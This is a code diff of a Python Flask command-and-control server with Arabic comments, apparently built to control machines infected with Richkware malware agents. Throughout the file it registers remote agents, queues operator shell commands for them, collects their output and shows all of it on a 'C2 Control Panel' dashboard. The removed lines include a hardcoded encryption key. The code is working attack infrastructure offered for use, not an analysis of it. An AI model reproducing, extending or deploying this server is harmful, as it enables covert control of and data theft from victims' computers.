@@ -1,182 +1,173 @@
-# c2_server.py - سيرفر متوافق مع Richkware (نسخة مصححة)
-
 from flask import Flask, request, jsonify, render_template_string
 import time
-import json
 from datetime import datetime
-import hashlib
+import json
 
 app = Flask(__name__)
 
-# ==================== إعدادات Richkware ====================
-ENCRYPTION_KEY = "7Fd3#9Lk2$mP5@nQ8!rT4&yU6*zX1"
+# مخازن البيانات في الذاكرة
+agents = {}          # لتخزين الأجهزة المتصلة
+pending_commands = {} # لتخزين الأوامر التي تنتظر التنفيذ
+results = {}         # لتخزين نتائج الأوامر المستلمة
 
-# تخزين البيانات في الذاكرة
-agents = {}          # الأجهزة المسجلة
-pending_commands = {} # الأوامر المنتظرة
-results = {}         # النتائج المستلمة
+# ---------------------------------------------------------
+# لوحة التحكم (الواجهة الرسومية)
+# ---------------------------------------------------------
+HTML_TEMPLATE = """
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>C2 Control Panel</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0f0f0f; color: #00ff00; padding: 20px; }
+        .container { max-width: 1000px; margin: auto; }
+        .card { background: #1a1a1a; border: 1px solid #333; padding: 20px; border-radius: 8px; margin-bottom: 20px; }
+        table { width: 100%; border-collapse: collapse; background: #111; }
+        th, td { padding: 12px; border: 1px solid #333; text-align: center; }
+        th { background: #222; color: #00ff00; }
+        tr:hover { background: #252525; }
+        input[type="text"] { background: #000; color: #00ff00; border: 1px solid #00ff00; padding: 5px; width: 150px; }
+        button { background: #00ff00; color: #000; border: none; padding: 5px 15px; cursor: pointer; font-weight: bold; }
+        .status-online { color: #00ff00; font-weight: bold; animation: blink 2s infinite; }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <h1>🎮 نظام التحكم المركزي (C2 Server)</h1>
+            <p>حالة السيرفر: <span class="status-online">LIVE</span> | الأجهزة النشطة: {{ agents|length }}</p>
+        </div>
 
-# ==================== نقاط النهاية (API) ====================
+        <div class="card">
+            <h3>🖥️ الأجهزة المتصلة</h3>
+            <table>
+                <thead>
+                    <tr>
+                        <th>المعرف (ID)</th>
+                        <th>عنوان IP</th>
+                        <th>آخر ظهور</th>
+                        <th>الحالة</th>
+                        <th>إجراء</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% for id, info in agents.items() %}
+                    <tr>
+                        <td>{{ id }}</td>
+                        <td>{{ info.ip }}</td>
+                        <td>{{ info.last_seen }}</td>
+                        <td class="status-online">Online</td>
+                        <td>
+                            <form action="/send-command" method="POST" style="display:inline;">
+                                <input type="hidden" name="agent_id" value="{{ id }}">
+                                <input type="text" name="command" placeholder="أمر (whoami)" required>
+                                <button type="submit">إرسال</button>
+                            </form>
+                        </td>
+                    </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+        </div>
 
+        <div class="card">
+            <h3>📜 سجل النتائج</h3>
+            <div style="max-height: 200px; overflow-y: auto;">
+                {% for res in results_list %}
+                <p style="border-bottom: 1px solid #333; padding: 5px;">
+                    <strong style="color: #fff;">[{{ res.time }}] {{ res.agent_id }}:</strong> {{ res.output }}
+                </p>
+                {% endfor %}
+            </div>
+        </div>
+    </div>
+</body>
+</html>
+"""
+
+# ---------------------------------------------------------
+# نقاط استقبال البيانات من العميل (C++)
+# ---------------------------------------------------------
+
+@app.route('/', methods=['GET'])
+def dashboard():
+    # تحويل النتائج إلى قائمة مرتبة زمنياً للعرض
+    results_list = sorted(results.values(), key=lambda x: x['time'], reverse=True)
+    return render_template_string(HTML_TEMPLATE, agents=agents, results_list=results_list)
+
+# هذا المسار سيعالج أي طلب POST يصل للسيرفر لضمان تسجيل الجهاز
 @app.route('/api/v1/agent/poll', methods=['POST'])
-def poll_commands():
-    """الوكيل يسأل عن أوامر جديدة وتحديث حالته"""
+@app.route('/poll', methods=['POST'])
+@app.route('/heartbeat', methods=['POST'])
+def handle_agent():
     try:
-        # طباعة البيانات الخام القادمة للفحص في Render Logs
-        print(f"\n[!] Incoming Poll from: {request.remote_addr}")
+        # طباعة الطلب في Logs لتعرف ما يحدث
+        print(f"\n[!] Incoming request from: {request.remote_addr} on path: {request.path}")
         
-        # محاولة قراءة البيانات كـ JSON
+        # محاولة قراءة البيانات القادمة
         data = request.get_json(silent=True) or {}
-        agent_id = data.get('agent_id')
-
-        if not agent_id:
-            # إذا لم يرسل ID، نحاول استخراجه من البيانات الخام أو نعطيه اسماً مؤقتاً
-            agent_id = f"unknown_{request.remote_addr.replace('.', '_')}"
-
-        # تحديث بيانات الوكيل في القائمة
-        if agent_id not in agents:
-            print(f"[+] New Agent Registered: {agent_id}")
-            agents[agent_id] = {
-                'first_seen': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-                'system_info': data.get('system_info', {}),
-                'ip': request.remote_addr
-            }
         
-        agents[agent_id]['last_seen'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        agents[agent_id]['status'] = 'Online'
+        # إذا لم يرسل العميل ID، سنصنع له واحداً بناءً على الـ IP
+        agent_id = data.get('agent_id') or f"PC_{request.remote_addr.replace('.', '_')}"
 
-        # التحقق من وجود أوامر معلقة لهذا الجهاز
+        # تسجيل وتحديث بيانات الجهاز
+        agents[agent_id] = {
+            'last_seen': datetime.now().strftime("%H:%M:%S"),
+            'ip': request.remote_addr,
+            'system_info': data.get('system_info', 'N/A')
+        }
+
+        # التحقق إذا كان هناك أمر ينتظر هذا الجهاز
+        response_data = {'has_command': False}
         if agent_id in pending_commands and pending_commands[agent_id]:
-            command = pending_commands[agent_id].pop(0)
-            print(f"[#] Sending Command: {command['cmd']} to {agent_id}")
-            return jsonify({
+            cmd = pending_commands[agent_id].pop(0)
+            response_data = {
                 'has_command': True,
-                'command_id': command['id'],
-                'command': command['cmd'],
-                'args': command.get('args', [])
-            }), 200
-        
-        # إذا لا توجد أوامر، نرد برد فارغ
-        return jsonify({
-            'has_command': False,
-            'server_time': datetime.now().isoformat()
-        }), 200
+                'command_id': cmd['id'],
+                'command': cmd['cmd'],
+                'args': []
+            }
+            print(f"[+] Command sent to {agent_id}: {cmd['cmd']}")
+
+        return jsonify(response_data), 200
 
     except Exception as e:
-        print(f"[-] Error in Poll: {e}")
+        print(f"[-] Error handling agent: {e}")
         return jsonify({'error': str(e)}), 500
 
 @app.route('/api/v1/agent/result', methods=['POST'])
-def submit_result():
-    """استلام نتائج تنفيذ الأوامر من الوكيل"""
+def handle_result():
     try:
         data = request.get_json(silent=True) or {}
-        agent_id = data.get('agent_id', 'unknown')
-        command_id = data.get('command_id', 'none')
-        output = data.get('output', '')
-
-        print(f"[V] Result Received from {agent_id} for command {command_id}")
-
-        key = f"{agent_id}_{command_id}_{int(time.time())}"
-        results[key] = {
+        agent_id = data.get('agent_id', 'Unknown')
+        output = data.get('output', 'No Output')
+        
+        res_id = f"{agent_id}_{int(time.time())}"
+        results[res_id] = {
             'agent_id': agent_id,
-            'command_id': command_id,
             'output': output,
-            'time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            'time': datetime.now().strftime("%H:%M:%S")
         }
-        return jsonify({'status': 'received'}), 200
+        print(f"[V] Result from {agent_id}: {output}")
+        return jsonify({'status': 'ok'}), 200
     except Exception as e:
-        print(f"[-] Error in Result: {e}")
         return jsonify({'error': str(e)}), 500
-
-# ==================== واجهة التحكم (Dashboard) ====================
-
-@app.route('/')
-def index():
-    """لوحة التحكم لعرض الأجهزة"""
-    html = """
-    <!DOCTYPE html>
-    <html lang="ar" dir="rtl">
-    <head>
-        <meta charset="UTF-8">
-        <title>C2 Control Panel</title>
-        <style>
-            body { font-family: sans-serif; background: #121212; color: #e0e0e0; padding: 20px; }
-            table { width: 100%; border-collapse: collapse; margin-top: 20px; background: #1e1e1e; }
-            th, td { padding: 12px; border: 1px solid #333; text-align: right; }
-            th { background: #333; color: #00ff00; }
-            .status-on { color: #00ff00; font-weight: bold; }
-            input, button { padding: 8px; border-radius: 4px; border: 1px solid #444; }
-            button { background: #007bff; color: white; cursor: pointer; }
-            .card { background: #1e1e1e; padding: 15px; border-radius: 8px; margin-bottom: 20px; }
-        </style>
-    </head>
-    <body>
-        <div class="card">
-            <h1>🎮 لوحة التحكم C2</h1>
-            <p>عدد الأجهزة المتصلة: <strong>{{ agents_count }}</strong></p>
-        </div>
-
-        <table>
-            <thead>
-                <tr>
-                    <th>المعرف (Agent ID)</th>
-                    <th>IP Address</th>
-                    <th>آخر ظهور</th>
-                    <th>الحالة</th>
-                    <th>إرسال أمر</th>
-                </tr>
-            </thead>
-            <tbody>
-                {% for id, info in agents.items() %}
-                <tr>
-                    <td>{{ id }}</td>
-                    <td>{{ info.ip }}</td>
-                    <td>{{ info.last_seen }}</td>
-                    <td class="status-on">متصل</td>
-                    <td>
-                        <form action="/send-command" method="POST" style="display:inline;">
-                            <input type="hidden" name="agent_id" value="{{ id }}">
-                            <input type="text" name="command" placeholder="مثلاً whoami" required>
-                            <button type="submit">إرسال</button>
-                        </form>
-                    </td>
-                </tr>
-                {% endfor %}
-            </tbody>
-        </table>
-        <br>
-        <div class="card">
-            <h3>📊 آخر النتائج المستلمة:</h3>
-            <ul>
-                {% for key, res in results.items() %}
-                <li><strong>{{ res.agent_id }}:</strong> {{ res.output }} <small>({{ res.time }})</small></li>
-                {% endfor %}
-            </ul>
-        </div>
-    </body>
-    </html>
-    """
-    return render_template_string(html, agents=agents, agents_count=len(agents), results=results)
 
 @app.route('/send-command', methods=['POST'])
 def send_command():
     agent_id = request.form.get('agent_id')
     cmd_text = request.form.get('command')
-    
     if agent_id and cmd_text:
         if agent_id not in pending_commands:
             pending_commands[agent_id] = []
-        
-        cmd_id = hashlib.md5(f"{agent_id}{cmd_text}{time.time()}".encode()).hexdigest()[:8]
         pending_commands[agent_id].append({
-            'id': cmd_id,
-            'cmd': cmd_text,
-            'args': []
+            'id': str(int(time.time())),
+            'cmd': cmd_text
         })
-        print(f"[+] Command Queued for {agent_id}: {cmd_text}")
-    
-    return """<script>alert('تم وضع الأمر في القائمة'); window.location.href='/';</script>"""
+    return '<script>window.location.href="/";</script>'
 
 if __name__ == '__main__':
+    # تشغيل السيرفر على المنفذ 8080 (Render سيحوله لـ 80/443 تلقائياً)
     app.run(host='0.0.0.0', port=8080)
